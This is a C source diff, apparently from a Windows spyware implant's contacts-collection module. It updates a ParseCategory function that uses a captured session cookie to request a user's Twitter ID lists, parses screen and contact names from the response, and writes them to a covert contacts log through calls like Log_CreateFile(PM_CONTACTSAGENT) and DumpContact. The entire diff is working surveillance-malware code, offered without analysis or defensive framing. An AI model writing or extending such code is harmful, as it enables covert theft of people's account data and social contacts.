@@ -35,6 +35,7 @@ DWORD ParseCategory(char *user, char *category, char *cookie, DWORD flags)
 	HANDLE hfile;
 	DWORD id_count;
 	WCHAR *screen_name_w, *contact_name_w;
+	char *tag1, *tag2;
 
 	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/%S/ids.json?cursor=-1&user_id=%S", category, user);
 	ret_val = HttpSocialRequest(L"api.twitter.com", L"GET", twitter_request, 443, NULL, 0, &r_buffer, &response_len, cookie);	
@@ -84,14 +85,30 @@ DWORD ParseCategory(char *user, char *category, char *cookie, DWORD flags)
 	
 		CheckProcessStatus();
 
+		// Verifica quale tag c'e' per primo
+		parser_inner1 = strstr((char *)r_buffer_inner, TW_CONTACT_ID1);
+		parser_inner2 = strstr((char *)r_buffer_inner, TW_CONTACT_ID2);
+		if (!parser_inner1 || !parser_inner2) {
+			SAFE_FREE(r_buffer);
+			SAFE_FREE(r_buffer_inner);
+			return SOCIAL_REQUEST_BAD_COOKIE;
+		}
+		if (parser_inner1 < parser_inner2) {
+			tag1 = TW_CONTACT_ID1;
+			tag2 = TW_CONTACT_ID2;
+		} else {
+			tag1 = TW_CONTACT_ID2;
+			tag2 = TW_CONTACT_ID1;
+		}
+
 		parser_inner1 = (char *)r_buffer_inner;
 	
 		hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
 		LOOP {
-			parser_inner1 = strstr(parser_inner1, TW_CONTACT_ID1);
+			parser_inner1 = strstr(parser_inner1, tag1);
 			if (!parser_inner1)
 				break;
-			parser_inner1 += strlen(TW_CONTACT_ID1);
+			parser_inner1 += strlen(tag1);
 			parser_inner2 = strchr(parser_inner1, '\"');
 			if (!parser_inner2)
 				break;
@@ -99,10 +116,10 @@ DWORD ParseCategory(char *user, char *category, char *cookie, DWORD flags)
 			_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser_inner1);
 			parser_inner1 = parser_inner2 + 1;
 
-			parser_inner1 = strstr(parser_inner1, TW_CONTACT_ID2);
+			parser_inner1 = strstr(parser_inner1, tag2);
 			if (!parser_inner1)
 				break;
-			parser_inner1 += strlen(TW_CONTACT_ID2);
+			parser_inner1 += strlen(tag2);
 			parser_inner2 = strchr(parser_inner1, '\"');
 			if (!parser_inner2)
 				break;
@@ -113,7 +130,10 @@ DWORD ParseCategory(char *user, char *category, char *cookie, DWORD flags)
 			contact_name_w = UTF8_2_UTF16(contact_name);
 			screen_name_w = UTF8_2_UTF16(screen_name);
 
-			DumpContact(hfile, CONTACT_SRC_TWITTER, screen_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, contact_name_w, NULL, flags);
+			if (tag1 != TW_CONTACT_ID1)
+				DumpContact(hfile, CONTACT_SRC_TWITTER, screen_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, contact_name_w, NULL, flags);
+			else
+				DumpContact(hfile, CONTACT_SRC_TWITTER, contact_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, screen_name_w, NULL, flags);
 		
 			SAFE_FREE(contact_name_w);
 			SAFE_FREE(screen_name_w);
